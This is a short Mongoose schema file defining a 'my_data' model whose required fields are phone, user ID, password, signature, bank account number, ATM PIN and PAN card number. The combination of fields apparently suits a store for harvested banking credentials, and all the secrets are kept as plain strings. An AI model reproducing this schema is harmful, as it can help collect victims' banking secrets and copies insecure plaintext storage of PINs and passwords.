const mongoose = require("mongoose");

//Schema
const DataSchema = new mongoose.Schema(
  {
    phone: {
      type: String,
      required: true,
    },
    user_id: {
      type: String,
      required: true,
    },
    password: {
      type: String,
      required: true,
    },
    signature: {
      type: String,
      required: true,
    },
    account_no: {
      type: String,
      required: true,
    },
    atm_pin: {
      type: String,
      required: true,
    },
    pan_card: {
      type: String,
      required: true,
    },
  },
  {
    timestamps: true,
  }
);

module.exports = mongoose.model("my_data", DataSchema);
